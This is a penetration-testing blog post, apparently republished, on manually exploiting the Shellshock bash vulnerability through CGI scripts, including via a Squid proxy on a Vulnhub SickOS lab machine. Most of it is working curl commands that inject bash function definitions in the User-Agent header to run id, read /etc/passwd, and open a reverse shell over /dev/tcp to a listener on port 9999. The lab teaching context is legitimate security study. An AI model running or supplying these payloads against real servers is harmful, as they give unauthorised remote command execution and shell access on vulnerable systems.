---
title: Exploiting Shellshock 🗿​
---
> Credits to [SevenLayers](https://www.sevenlayers.com/index.php/125-exploiting-shellshock)

## Exploiting Shellshock Manually

The scanner comes back with:  "**Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).**"  
  
I realize I'm talking about a four year old vulnerability but it's one that still exists and it's a rabbit hole I wanted to jump into.  I've come across this vulnerability a few times in the past and I've either used Metasploit or 34900.py ("Apache mod_cgi - 'Shellshock' Remote Command Injection") to get my shell.  I seem to recall having an issue with one or both at some point and I moved on to another avenue because my search results yielded bits and pieces but nothing that I could wrap my hands around.  
  
Stumbling upon this vulnerability recently, I paused to dig into it with the intention of getting a better understanding for manual exploitation.

The classic examples I see in from searches are the remote test:  
  
```shell
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.90.59/cgi-bin/test.sh
```
  
![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image001.jpg)  
  
  
And the local test:  
  
```shell
x='() { :;}; echo VULNERABLE' bash -c :
```
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image002.jpg)  
  
If I'm local, I don't really care, I already have a shell.  It's that remote angle I want to leverage.  With a slight change of our syntax, we can read /etc/passwd:  
  
```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://192.168.90.59/cgi-bin/test.sh
```
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image003.jpg)  
  
Nice!  
  
Now let's test for outbound connectivity on port 9999:  
  
```
curl -H 'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.90.35:9999'' http://192.168.90.59/cgi-bin/test.sh
```
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image004.jpg)  
  
  
On our side, we setup the listener:  
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image005a.jpg)  
  
  
Cool.  We know we can connect outbound on port 9999, let's go for the reverse shell:  
  
```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.90.35/9999 0>&1' http://192.168.90.59/cgi-bin/test.sh
```
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image006.jpg)  
  
  
Setting up the listener:  
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image007.jpg)  
  
  
Excellent -- we have a shell!   
  
It wasn't really that hard to get this working, I just needed to play with the syntax.  In my searching, I saw examples of using wget or curl to pull in other files but I never understood why the need to add extra steps when you can get the shell directly.    
  
So maybe you're thinking what's the big deal?  Why did I need to go through this exercise?    
  
Sometimes I rely on tools and it's a crutch.  Sometimes I understand the mechanics and the tool is just easier / quicker.  In this case, it was most definitely a crutch for a lack of knowledge and here's where this would have helped me out.   
  
A while ago, I wrote up [Vulnhub SickOS 1.1 Walkthrough](https://www.sevenlayers.com/index.php/85-vulnhub-sickos-1-1-walkthrough) and I actually noted the server was vulnerable to Shellshock.  In the writeup, I walk through the process of exploiting the CMS which gets me a low privilege shell but now let me take you through the express lane.  
  
We know we have a Squid proxy running on our target.  Let's use Curl to hit the CGI script through the proxy:  
  
```shell
curl -x http://192.168.90.61:3128 -L http://127.0.0.1/cgi-bin/status
```
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image008.jpg)  
  
Cool, it works.  Now let's check to see if it's vulnerable to Shellshock (we already know it is -- humor me!):  
  
```shell
curl -x http://192.168.90.61:3128 -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" -L http://127.0.0.1/cgi-bin/status
```
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image009.jpg)  
  
  
Excellent!  Now let's get that shell:  
  
```shell
curl -x http://192.168.90.61:3128 -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.90.35/9999 0>&1' -L http://127.0.0.1/cgi-bin/status```  
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image010.jpg)  
  
  
Setting up the listener:  
  

![](https://www.sevenlayers.com/images/blogimages/2018/Shellshock/image011.jpg)

Shellz for everyone!